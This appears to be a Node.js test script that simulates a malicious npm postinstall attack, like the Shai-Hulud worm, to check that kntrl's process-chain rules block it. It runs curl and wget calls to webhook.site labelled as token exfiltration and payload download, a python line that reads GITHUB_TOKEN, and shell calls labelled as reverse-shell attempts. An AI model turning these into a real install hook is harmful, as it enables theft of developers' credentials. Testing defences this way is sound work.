/**
 * Simulates a malicious npm postinstall script (like Shai-Hulud).
 * Each command is expected to be BLOCKED by kntrl's process chain rules.
 * We use try/catch so the script continues even when kntrl kills the child.
 */
const { execSync } = require("child_process");

function tryExec(label, cmd) {
  console.log(`\n[attack-sim] Attempting: ${label}`);
  try {
    const out = execSync(cmd, { timeout: 5000, encoding: "utf-8" });
    console.log(`[attack-sim] ${label} — NOT blocked (unexpected): ${out.trim()}`);
  } catch (err) {
    console.log(`[attack-sim] ${label} — blocked or failed (expected): ${err.message.split("\n")[0]}`);
  }
}

// 1. npm → curl (exfiltrate tokens to webhook.site)
tryExec("npm > curl (exfil)", "curl -s --max-time 3 https://webhook.site/test-exfil");

// 2. npm → wget (download payload)
tryExec("npm > wget (payload)", "wget -q --timeout=3 -O /dev/null https://webhook.site/test-payload");

// 3. npm → python (run credential harvester)
tryExec("npm > python", 'python3 -c "import os; print(os.environ.get(\'GITHUB_TOKEN\', \'no-token\'))"');

// 4. npm → bash (reverse shell attempt)
tryExec("npm > bash", 'bash -c "echo attacker-shell-sim"');

// 5. npm → sh (generic shell)
tryExec("npm > sh", 'sh -c "echo attacker-sh-sim"');

console.log("\n[attack-sim] All attack simulations completed.");
